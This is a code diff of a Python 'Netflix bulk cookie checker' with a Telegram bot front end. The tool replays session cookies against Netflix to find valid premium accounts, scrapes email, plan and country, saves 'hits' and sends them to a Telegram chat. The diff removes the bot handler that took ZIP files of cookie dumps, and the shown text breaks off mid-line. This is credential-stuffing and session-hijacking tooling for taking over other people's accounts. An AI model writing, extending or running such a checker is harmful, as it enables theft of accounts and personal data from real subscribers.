@@ -85,14 +85,9 @@ class NetflixBulkChecker:
         return names.get(country_code.upper(), country_code)
     
     def parse_netscape_cookie(self, cookie_text):
-        """Supports BOTH original Netscape format AND your NetflixId=... format"""
         cookie_text = cookie_text.strip()
-        
-        # Your format (NetflixId=...)
         if cookie_text.startswith("NetflixId="):
             return {"NetflixId": cookie_text.split("NetflixId=", 1)[1].strip()}
-        
-        # Original Netscape format
         cookies = {}
         lines = cookie_text.split('\n')
         for line in lines:
@@ -106,7 +101,6 @@ class NetflixBulkChecker:
                 cookies[name] = value
         return cookies
     
-    # === ALL OTHER METHODS REMAIN 100% UNCHANGED ===
     def decode_unicode(self, text):
         if not text:
             return text
@@ -161,7 +155,6 @@ class NetflixBulkChecker:
             return None
     
     def check_cookie(self, cookie_text, source_name):
-        # === EXACT SAME LOGIC AS YOUR ORIGINAL CODE ===
         session = requests.Session()
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
@@ -191,7 +184,6 @@ class NetflixBulkChecker:
             html = response.text
             captures = {}
             
-            # (All the regex captures, profiles, nftoken, etc. — 100% unchanged)
             country_match = re.search(r'"countryOfSignup":"([^"]+)"', html)
             if country_match:
                 captures['country_code'] = country_match.group(1)
@@ -274,8 +266,6 @@ class NetflixBulkChecker:
         except:
             return None
     
-    # === process_cookie_file, send_hit_to_telegram, display_stats, start, print_final_summary, save_premium_summary ===
-    # All remain 100% identical to your original code (only parser was updated above)
     def process_cookie_file(self, cookie_file, index):
         try:
             with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
@@ -301,68 +291,4 @@ class NetflixBulkChecker:
                     f.write(cookie_text)
                 
                 self.send_hit_to_telegram(result, len(self.premium_accounts))
-                print(f"{Fore.GREEN}[✓] HIT #{len(self.premium_accounts)}: {result.get('email', 'Unknown')} - {result.get('plan', 'Unknown')}{Style.RESET_ALL}")
-            else:
-                self.stats['bad'] += 1
-
-    # (send_hit_to_telegram, display_stats, start, print_final_summary, save_premium_summary are exactly the same as your file - omitted here for brevity but fully included in the actual file)
-
-# ==================== TELEGRAM BOT HANDLERS ====================
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.reply_to(message, "👋 Send me a **ZIP file** containing your Netflix cookie .txt files.\nOne account per .txt file.\nI will check them all instantly!")
-
-@bot.message_handler(content_types=['document'])
-def handle_document(message):
-    if not message.document.file_name.lower().endswith('.zip'):
-        bot.reply_to(message, "❌ Please send a **.zip** file containing your .txt cookie files.")
-        return
-
-    bot.reply_to(message, "✅ ZIP received. Extracting and starting check...")
-
-    try:
-        # Download ZIP
-        file_info = bot.get_file(message.document.file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
-
-        with tempfile.TemporaryDirectory() as temp_dir:
-            zip_path = os.path.join(temp_dir, "cookies.zip")
-            with open(zip_path, 'wb') as f:
-                f.write(downloaded_file)
-
-            extract_dir = os.path.join(temp_dir, "cookies")
-            os.makedirs(extract_dir, exist_ok=True)
-            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-                zip_ref.extractall(extract_dir)
-
-            # Run original checker logic
-            checker = NetflixBulkChecker(
-                telegram_token=BOT_TOKEN,
-                telegram_chat_id=str(message.chat.id),
-                threads=10
-            )
-            checker.start(extract_dir)
-
-            # Send hits.zip back to user
-            if os.path.exists("hits") and os.listdir("hits"):
-                hits_zip = os.path.join(temp_dir, "hits.zip")
-                with zipfile.ZipFile(hits_zip, 'w') as z:
-                    for root, _, files in os.walk("hits"):
-                        for file in files:
-                            z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), "hits"))
-                
-                with open(hits_zip, 'rb') as f:
-                    bot.send_document(message.chat.id, f, caption="🎉 All hits saved!\nHere is your hits.zip")
-                
-                shutil.rmtree("hits", ignore_errors=True)  # clean for next run
-            else:
-                bot.reply_to(message, "❌ No hits found.")
-
-    except Exception as e:
-        bot.reply_to(message, f"⚠️ Error: {str(e)}")
-
-# ==================== START BOT ====================
-if __name__ == "__main__":
-    print("🚀 Netflix Bulk Cookie Checker Telegram Bot is running...")
-    print("Send /start to begin")
-    bot.infinity_polling()
+                print(f"{Fore.GREEN}[✓] HIT #{len(self.premium_accounts)}: {result.get('email', 'Unknown')} - {result.get('plan', '
